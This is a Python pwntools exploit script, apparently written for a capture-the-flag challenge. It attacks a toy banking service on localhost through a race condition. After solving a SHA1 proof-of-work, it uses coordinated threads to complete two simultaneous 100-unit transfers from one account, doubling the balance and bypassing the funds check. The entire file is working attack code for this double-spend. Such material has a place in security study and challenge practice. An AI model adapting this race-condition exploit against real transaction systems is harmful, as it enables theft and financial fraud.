#!/usr/bin/python

from pwn import *
from Queue import Queue
import hashlib
import threading

global_nm = "597632"
global_pw = "592096"

''' dirty dirty pow code '''
def pow(target):
    for i in xrange(1, 0x100):
        for j in xrange(1, 0x100):
            for k in xrange(1, 0x100):
                for l in xrange(1, 0x100):
                    h = hashlib.sha1()
                    h.update(chr(i)+chr(j)+chr(k)+chr(l))
                    if (h.hexdigest()[-6:] == target):
                        r = chr(i)+chr(j)+chr(k)+chr(l)
                        return r

def new_account(p, nm, pw):
    p.readuntil("Choose:")
    p.sendline("1")
    p.readuntil("Username: ")
    p.sendline(nm)
    p.readuntil("Password: ")
    p.sendline(pw)
    p.readuntil("hash: ")
    target = p.readuntil("\n")[:-1]
    target = target[-6:]
    r = pow(target)
    if not r:
        print "pow failed"
        exit(0)
    p.sendline(r)

def login(p, nm, pw):
    p.readuntil("Choose:")
    p.sendline("3")
    p.readuntil("Username:")
    p.sendline(nm)
    p.readuntil("Password:")
    p.sendline(pw)

def check_balance(p):
    p.readuntil("Choose:")
    p.sendline("4")
    p.readuntil(": ")
    return int(p.readuntil("\n"))

def init_transfer(p, to, amount):
    p.readuntil("Choose:")
    p.sendline("5")
    p.readuntil("Transfer to:")
    p.sendline(to)
    p.readuntil("Amount:")
    p.sendline(str(amount))
    p.readuntil("ID: ")
    trid = p.readuntil(",")[:-1]
    p.readuntil("code: ")
    code = p.readuntil("\n")[:-1]
    return trid, code

def comp_transfer(p, trid, code):
    p.readuntil("Choose:")
    p.sendline("7")
    p.readuntil("id:")
    p.sendline(trid)
    p.readuntil("Code:")
    p.sendline(code)

m = Queue()
vic_queue = Queue()
tha_queue = Queue()
thb_queue = Queue()

def thread_victim(nm, pw, nm_a, nm_b):

    p = remote("localhost", 9999)

    new_account(p, nm, pw)
    print "victim ready."

    while True:
        vic_queue.get()
        vic_queue.get()
        print "response ok."

        trid_a, code_a = init_transfer(p, nm_a, 100)
        trid_b, code_b = init_transfer(p, nm_b, 100)
        print "transaction initiated."

        data_a = [trid_a, code_a]
        data_b = [trid_b, code_b]
        tha_queue.put(data_a)
        thb_queue.put(data_b)

        vic_queue.get()
        vic_queue.get()

        sleep(1)

        if (check_balance(p) == 0):

            data1 = vic_queue.get()
            data2 = vic_queue.get()

            if (data1):
                data = data1
            if (data2):
                data = data2

            if (data[0] == 'a'):
                print "transfer a"
                comp_transfer(p, data[1], data[2])

            if (data[0] == 'b'):
                print "transfer b"
                comp_transfer(p, data[1], data[2])

            tha_queue.put(0)
            thb_queue.put(0)

        else:
            p.interactive()
            break

    p.close()

    m.put(0)

def thread_a(nm, pw, vic_nm):

    p = remote("localhost", 9999)

    new_account(p, nm, pw)

    while True:
        print "thread a ready."
        vic_queue.put(0)

        # ready for victim
        data = tha_queue.get()

        comp_transfer(p, data[0], data[1])
        vic_queue.put(0)

        sleep(1)

        if (check_balance(p) > 100):
            print "a got balance"
            t,c = init_transfer(p, vic_nm, 100)
            vic_queue.put(['a',t,c])
        else:
            vic_queue.put(False)

        print "a waiting for end"
        tha_queue.get()

    p.close()

    print "thread a done."

def thread_b(nm, pw, vic_nm):

    p = remote("localhost", 9999)

    new_account(p, nm, pw)

    while True:
        print "thread b ready."
        vic_queue.put(0)

        # ready for victim
        data = thb_queue.get()

        comp_transfer(p, data[0], data[1])
        vic_queue.put(0)

        sleep(1)

        if (check_balance(p) > 100):
            print "b got balance"
            t,c = init_transfer(p, vic_nm, 100)
            vic_queue.put(['b',t,c])
        else:
            vic_queue.put(False)

        print "b waiting for end"
        thb_queue.get()

    p.close()
    print "thread b done"

raw_input(">>> ")

while True:
    nm_v = str(randint(0, 0x100000))
    pw_v = str(randint(0, 0x100000))
    nm_a = str(randint(0, 0x100000))
    pw_a = str(randint(0, 0x100000))
    nm_b = str(randint(0, 0x100000))
    pw_b = str(randint(0, 0x100000))

    vt = Thread(target=thread_victim,
                args=(nm_v, pw_v, nm_a, nm_b))
    at = Thread(target=thread_a, args=(nm_a, pw_a, nm_v))
    bt = Thread(target=thread_b, args=(nm_b, pw_b, nm_v))

    vt.daemon = True
    at.daemon = True
    bt.daemon = True

    vt.start()
    at.start()
    bt.start()

    m.get()

'''
p = remote("localhost", 9999)

if not (global_nm and global_pw):
    global_nm = str(randint(0, 0x100000))
    global_pw = str(randint(0, 0x100000))
    new_account(p, global_nm, global_pw)
else:
    login(p, global_nm, global_pw)

log.info("nm = %s\npw = %s", global_nm, global_pw)

print check_balance(p)

p.interactive()
'''